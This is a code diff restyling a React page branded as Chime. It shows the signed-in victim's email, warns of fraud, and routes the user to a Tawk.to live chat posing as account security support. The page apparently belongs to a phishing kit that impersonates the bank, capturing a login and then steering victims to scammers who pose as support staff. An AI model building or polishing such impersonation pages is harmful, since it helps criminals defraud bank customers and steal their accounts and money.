@@ -1,5 +1,5 @@
 import { useEffect } from "react";
-import { Box, Typography, Button, Link, Stack, Divider } from "@mui/material";
+import { Box, Typography, Button, Link, Stack, Divider, Paper } from "@mui/material";
 import WarningAmberIcon from "@mui/icons-material/WarningAmber";
 import SupportAgentIcon from "@mui/icons-material/SupportAgent";
 import { emailStore } from "./authStore";
@@ -27,83 +27,139 @@ export default function FraudSupport() {
 
     const email = emailStore((state) => state.email);
     
-  return (
-    <Box
-      sx={{
-        minHeight: "100vh",
-        bgcolor: "#031f1a",
-        display: "flex",
-        justifyContent: "center",
-        alignItems: "center",
-        px: 2,
-        color: "white",
-      }}
-    >
-      <Box sx={{ width: 400 }}>
-        {/* Logo */}
-        <Typography
-          variant="h3"
-          sx={{ color: "#2de28a", fontWeight: 700, mb: 3 }}
-        >
-          chime
-        </Typography>
-
-        <Typography sx={{ fontSize: "0.95rem" }}>
-          {email}
-        </Typography>
-
-        {/* Alert */}
-        <Box
+    return (
+      <Box
+        sx={{
+          minHeight: "100vh",
+          bgcolor: "#031f1a",
+          display: "flex",
+          justifyContent: "center",
+          alignItems: "center",
+          px: 2,
+        }}
+      >
+        <Paper
+          elevation={0}
           sx={{
-            display: "flex",
-            gap: 2,
-            bgcolor: "#102f28",
-            p: 2,
-            borderRadius: "14px",
-            mb: 3,
-            alignItems: "center",
+            width: "100%",
+            maxWidth: 450,
+            bgcolor: "transparent",
+            color: "#fff",
           }}
         >
-          <WarningAmberIcon sx={{ color: "#f5c542" }} />
-          <Typography sx={{ fontSize: "0.95rem" }}>
-            Think you’ve been a victim of fraud? Act immediately to secure your
-            account.
+          {/* Logo */}
+          <Typography variant="h3" fontWeight={700} color="#2de28a" mb={4}>
+            chime
           </Typography>
-        </Box>
 
-        {/* Actions */}
-        <Stack spacing={2}>
-          <Button
-            onClick={() => window.Tawk_API?.toggle()}
-            startIcon={<SupportAgentIcon />}
-            fullWidth
-            sx={btnSecondary}
+          {/* Heading */}
+          <Typography variant="h5" fontWeight={600}>
+            Account Security Support
+          </Typography>
+
+          <Typography
+            sx={{
+              mt: 1,
+              color: "#9db1ab",
+              wordBreak: "break-word",
+            }}
           >
-            Chat with support to secure your account
+            Signed in as <strong>{email}</strong>
+          </Typography>
+
+          {/* Notice */}
+          <Box
+            sx={{
+              mt: 4,
+              display: "flex",
+              alignItems: "flex-start",
+              gap: 2,
+              p: 2,
+              borderRadius: 2,
+              bgcolor: "#0b2c25",
+              border: "1px solid #1f4a40",
+            }}
+          >
+            <WarningAmberIcon
+              sx={{
+                color: "#f5c542",
+                mt: "2px",
+              }}
+            />
+
+            <Box>
+              <Typography fontWeight={600}>
+                Need help securing your account?
+              </Typography>
+
+              <Typography
+                sx={{
+                  mt: 0.5,
+                  fontSize: ".9rem",
+                  color: "#9db1ab",
+                }}
+              >
+                If you've noticed suspicious activity, unauthorized
+                transactions, or believe your account may have been compromised,
+                our support team is ready to assist you.
+              </Typography>
+            </Box>
+          </Box>
+
+          {/* Button */}
+          <Button
+            fullWidth
+            startIcon={<SupportAgentIcon />}
+            onClick={() => window.Tawk_API?.toggle()}
+            sx={{
+              mt: 4,
+              py: 1.6,
+              borderRadius: 2,
+              bgcolor: "#04ffc5",
+              color: "#031f1a",
+              fontWeight: 700,
+              textTransform: "none",
+              "&:hover": {
+                bgcolor: "#00ddb0",
+              },
+            }}
+          >
+            Contact Support
           </Button>
-        </Stack>
 
-        <Divider sx={{ my: 4, borderColor: "#24443d" }} />
+          <Divider
+            sx={{
+              my: 4,
+              borderColor: "#23453d",
+            }}
+          />
 
-        {/* Info */}
-        <Typography sx={{ fontSize: "0.9rem", mb: 2 }}>
-          Our support team is available 24/7 to help you secure your account,
-          review transactions, and take action.
-        </Typography>
+          {/* Footer Text */}
+          <Typography
+            sx={{
+              color: "#9db1ab",
+              fontSize: ".9rem",
+              lineHeight: 1.7,
+            }}
+          >
+            Support specialists are available to help review account activity,
+            verify recent transactions, answer security-related questions, and
+            guide you through the next steps if your account has been affected.
+          </Typography>
 
-        {/* Footer */}
-        <Typography
-          sx={{
-            mt: 4,
-            fontSize: "0.75rem",
-            color: "#8aa39c",
-          }}
-        >
-          © 2026 Chime. All Rights Reserved.
-        </Typography>
+          <Typography
+            align="center"
+            sx={{
+              mt: 5,
+              color: "#7f9992",
+              fontSize: ".8rem",
+            }}
+          >
+            © 2026 Chime. All rights reserved.
+          </Typography>
+        </Paper>
       </Box>
-    </Box>
-  );
+    );
 }
 
 /* 🔹 Button styles */
